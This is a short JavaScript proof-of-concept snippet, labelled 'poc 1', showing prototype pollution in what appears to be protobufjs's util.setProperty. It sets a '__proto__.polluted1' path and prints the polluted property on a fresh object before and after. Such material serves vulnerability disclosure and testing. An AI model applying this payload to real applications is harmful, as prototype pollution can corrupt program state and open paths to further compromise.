// npm i protobufjs 
const setProperty = require("./example"); // poc 1 -  util.setProperty() 
console.log({}.polluted1); 
setProperty({}, "__proto__.polluted1", "polluted1"); 
console.log({}.polluted1); 